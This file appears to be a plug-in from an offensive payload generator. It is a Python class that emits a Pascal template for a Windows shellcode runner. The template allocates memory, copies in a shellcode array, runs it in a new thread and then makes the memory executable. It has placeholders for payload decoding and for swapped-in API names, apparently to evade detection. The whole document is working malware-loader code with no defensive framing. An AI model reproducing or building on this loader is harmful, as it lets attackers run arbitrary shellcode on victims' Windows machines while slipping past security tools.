class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['Classes', 'windows', 'sysutils']

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
procedure main;
var
    shellcode : array of byte;
    hThread: Handle;
    addr: Pointer;
    ThreadId: LongWord;
    oldProtect: LongWord;

begin
    
    {transformers}

    addr := {VirtualAlloc}(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE);

    CopyMemory(addr,shellcode,{shellcodeSize});
    hThread := {CreateThread}(nil, 0, addr, nil, 0, ThreadId);

    {VirtualProtect}(addr, {shellcodeSize}, PAGE_EXECUTE_READ, oldProtect);

    {WaitForSingleObject}(hThread, INFINITE);
    {CloseHandle}(hThread);
end;
"""